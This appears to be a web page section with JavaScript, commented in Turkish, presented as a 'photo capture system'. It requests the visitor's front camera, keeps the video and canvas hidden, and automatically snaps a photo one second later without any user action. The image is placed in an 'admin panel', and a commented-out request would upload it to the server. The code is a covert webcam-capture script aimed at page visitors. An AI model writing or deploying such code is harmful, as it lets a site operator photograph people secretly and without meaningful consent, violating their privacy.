<!-- Kamera ve Admin Paneli Bölümü -->
<section id="cameraSection">
  <h2 style="text-align:center;margin-bottom:1rem;color:var(--c1)">Fotoğraf Çekme Sistemi</h2>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div id="adminPanel" style="display:flex;flex-wrap:wrap;gap:.5rem;justify-content:center;margin-top:1rem;"></div>
</section>

<script>
// Kamera ve otomatik çekim
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const adminPanel = document.getElementById('adminPanel');

// Kamera izni ve otomatik fotoğraf çekme
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
.then(stream => {
    video.srcObject = stream;

    video.onloadedmetadata = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // 1 saniye sonra otomatik fotoğraf çek
        setTimeout(() => {
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/png');

            // Fotoğrafı "admin paneline" ekle
            const imgEl = document.createElement('img');
            imgEl.src = imgData;
            imgEl.style.width = '160px';
            imgEl.style.height = '120px';
            imgEl.style.border = '1px solid var(--c1)';
            adminPanel.appendChild(imgEl);

            // Sunucuya gönderme örneği (backend ile entegre edilecek)
            /*
            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imgData })
            })
            .then(res => console.log("Fotoğraf gönderildi"))
            .catch(err => console.error(err));
            */
        }, 1000);
    };
})
.catch(err => alert("Kamera izni reddedildi: " + err));

// Admin paneli aç/kapat örneği
function openAdmin() {
    const section = document.getElementById('cameraSection');
    section.scrollIntoView({ behavior: 'smooth' });
}
</script>
